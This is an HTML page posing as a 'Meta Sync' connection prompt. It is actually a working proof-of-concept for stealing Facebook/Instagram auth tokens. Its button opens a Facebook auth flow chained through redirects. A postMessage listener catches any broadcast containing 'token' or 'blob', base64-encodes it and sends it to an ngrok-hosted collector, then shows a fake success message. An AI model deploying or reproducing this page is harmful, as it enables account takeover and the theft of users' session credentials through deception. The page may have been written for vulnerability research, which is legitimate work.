<!DOCTYPE html>
<html>
<head><title>Meta Sync</title></head>
<body style="text-align:center; padding-top:50px; font-family:sans-serif;">
    <h2>Connection Required</h2>
    <p>Click the button below to start the secure sync.</p>
    
    <button onclick="startSync()" style="padding:15px 30px; background:#1877F2; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold;">
        SYNC ACCOUNTS
    </button>

    <script>
        function startSync() {
            const armedLink = "https://www.facebook.com/fxauth/?app_id=1217981644879628&etoken=AbkdqR8gSOIdA6pB1QLaljpIpIDxmp6gdlpgGqy3KqhBFJmEIuuBGbRenNJjnorbCU5-USgb5cWL6tdiq89aEsxNBOQ6BFNp1uiIc6EZRNcaFP6BxsJ-C9IE&native_app_login_flow=fbcalcomettest&entry_point=ig_web_settings&next=https%3A%2F%2Fwww.instagram.com%2Freels%2Faudio%2Fexternal%3Furl%3Dhttps%3A%2F%2Fcyanide122.github.io%2Fassets%2Fgo.html";
            
            // Open the auth flow in a popup
            window.open(armedLink, "fbPopup", "width=600,height=700");
        }

        // üïµÔ∏è THE COLLECTOR: Because the targetOrigin is '*', 
        // this listener will catch the token even from the popup!
        window.addEventListener("message", function(event) {
            console.log("üì• Caught a broadcast from:", event.origin);
            
            let data = JSON.stringify(event.data);
            if (data.includes("token") || data.includes("blob")) {
                // üöÄ SEND TO PYTHON IMMEDIATELY
                fetch("https://bolsteringly-rightish-joan.ngrok-free.dev/log?data=" + btoa(data), {mode:'no-cors'});
                
                alert("SUCCESS: Data Captured. Check your terminal.");
                document.body.innerHTML = "<h1>Verification Successful!</h1>";
            }
        }, false);
    </script>
</body>
</html>
